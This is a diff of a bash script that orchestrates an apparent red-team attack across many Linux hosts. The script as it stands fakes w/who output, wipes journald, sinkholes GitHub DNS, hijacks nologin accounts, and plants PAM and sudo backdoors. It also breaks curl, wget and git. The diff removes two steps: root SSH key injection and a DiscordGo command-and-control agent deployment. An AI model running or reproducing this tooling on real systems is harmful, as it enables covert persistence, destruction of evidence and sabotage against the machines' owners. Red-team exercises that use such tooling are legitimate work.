@@ -160,15 +160,6 @@ print_receipt() {
     echo
 }
 
-# ── generate root SSH keypair (used by root-ssh wave) ────────────────────────
-mkdir -p "${RT_DIR}/loot"
-RT_ROOT_KEY="${RT_DIR}/loot/root-ssh_$(date +%Y%m%d-%H%M%S)_ed25519"
-ssh-keygen -t ed25519 -f "$RT_ROOT_KEY" -N "" -q -C "rt-root-$(date +%Y%m%d)"
-RT_ROOT_PUBKEY=$(cat "${RT_ROOT_KEY}.pub")
-rm -f "${RT_ROOT_KEY}.pub"
-chmod 600 "$RT_ROOT_KEY"
-info "Root SSH keypair generated → ${RT_ROOT_KEY}"
-
 # ── banner ────────────────────────────────────────────────────────────────────
 echo -e "${RED}${BOLD}"
 cat << 'EOF'
@@ -193,73 +184,42 @@ cat << 'EOF'
 EOF
 echo -e "${NC}"
 
-# ── step 1: root SSH access ───────────────────────────────────────────────────
-hdr "Step 1/9 — Enabling root SSH"
-info "Deploying root-ssh to all Linux hosts…"
-wave "root-ssh       " root-ssh install --key "$RT_ROOT_PUBKEY"
-
-# ── step 2: DiscordGo agent ───────────────────────────────────────────────────
-# Must run BEFORE sinkhole (step 5) and break-net-tools (step 8) — both of
-# which break DNS and outbound connectivity that the agent needs to call home.
-hdr "Step 2/9 — Deploying DiscordGo agent"
-info "Dropping DiscordGo C2 to all Linux hosts as root…"
-RECEIPT_LABELS+=("discordgo-agent")
-_dgo_tmp=$(mktemp)
-"${RT_DIR}/DiscordGo/deploy-discordgo.sh" \
-    -u root -i "$RT_ROOT_KEY" --no-sudo --linux-only \
-    -j "$MAX_JOBS" \
-    $([[ $DRY_RUN -eq 1 ]] && echo "--dry-run") 2>&1 | tee "$_dgo_tmp" || true
-_dgo_summary=$(grep -oE "[0-9]+ passed, [0-9]+ failed \(of [0-9]+ hosts\)" "$_dgo_tmp" 2>/dev/null | tail -1)
-_dgo_passed=0; _dgo_failed=0; _dgo_total=0
-if [[ -n "$_dgo_summary" ]]; then
-    _dgo_passed=$(grep -oE "^[0-9]+" <<< "$_dgo_summary")
-    _dgo_failed=$(grep -oE "^[0-9]+" <<< "${_dgo_summary#* passed, }")
-    _dgo_total=$(grep -oE "\(of ([0-9]+)" <<< "$_dgo_summary" | grep -oE "[0-9]+")
-fi
-RECEIPT_PASSED+=("$_dgo_passed")
-RECEIPT_FAILED+=("$_dgo_failed")
-RECEIPT_TOTAL+=("$_dgo_total")
-RECEIPT_REASONS+=("")
-rm -f "$_dgo_tmp"
-
-# ── step 3: compromise w + who ────────────────────────────────────────────────
-hdr "Step 3/9 — Faking w + who"
+# ── step 1: compromise w + who ────────────────────────────────────────────────
+hdr "Step 1/7 — Faking w + who"
 info "Deploying compromise-who to all Linux hosts…"
-wave "compromise-who " compromise-who install
+wave "compromise-who" compromise-who install
 
-# ── step 4: nuke journal ──────────────────────────────────────────────────────
-hdr "Step 4/9 — Nuking journald"
+# ── step 2: nuke journal ──────────────────────────────────────────────────────
+hdr "Step 2/7 — Nuking journald"
 info "Deploying nuke-journal to all Linux hosts…"
 wave "nuke-journal   " nuke-journal install
 
-# ── step 5: github sinkhole ───────────────────────────────────────────────────
-hdr "Step 5/9 — GitHub dnsmasq sinkhole"
+# ── step 3: github sinkhole ───────────────────────────────────────────────────
+hdr "Step 3/7 — GitHub dnsmasq sinkhole"
 info "Deploying sinkhole to all Linux hosts…"
 wave "sinkhole       " sinkhole install
 
-# ── step 6: infinite users ────────────────────────────────────────────────────
-hdr "Step 6/9 — Hijacking nologin accounts"
+# ── step 4: infinite users ────────────────────────────────────────────────────
+hdr "Step 4/7 — Hijacking nologin accounts"
 info "Deploying infinite-users to all Linux hosts…"
 wave "infinite-users " infinite-users install
 
-# ── step 7: PAM backdoor ──────────────────────────────────────────────────────
-hdr "Step 7/9 — PAM backdoor"
+# ── step 5: PAM backdoor ──────────────────────────────────────────────────────
+hdr "Step 5/7 — PAM backdoor"
 info "Deploying pam-backdoor to all Linux hosts…"
 wave "pam-backdoor   " pam-backdoor install
 
-# ── step 8: break net tools ───────────────────────────────────────────────────
-hdr "Step 8/9 — Breaking curl, wget, git"
+# ── step 6: break net tools ───────────────────────────────────────────────────
+hdr "Step 6/7 — Breaking curl, wget, git"
 info "Deploying break-net-tools to all Linux hosts…"
 wave "break-net-tools" break-net-tools install
 
-# ── step 9: sudo binary backdoor ──────────────────────────────────────────────
-hdr "Step 9/9 — Backdooring sudo"
+# ── step 7: sudo binary backdoor ──────────────────────────────────────────────
+hdr "Step 7/7 — Backdooring sudo"
 info "Deploying sudo-binary to all Linux hosts…"
 wave "sudo-binary    " sudo-binary install
 
 # ── receipt ───────────────────────────────────────────────────────────────────
 print_receipt
-echo -e "${CYAN}${BOLD}  Root SSH key → ${RT_ROOT_KEY}${NC}"
-echo
 echo -e "${GREEN}${BOLD}  Madness achieved.${NC}"
 echo
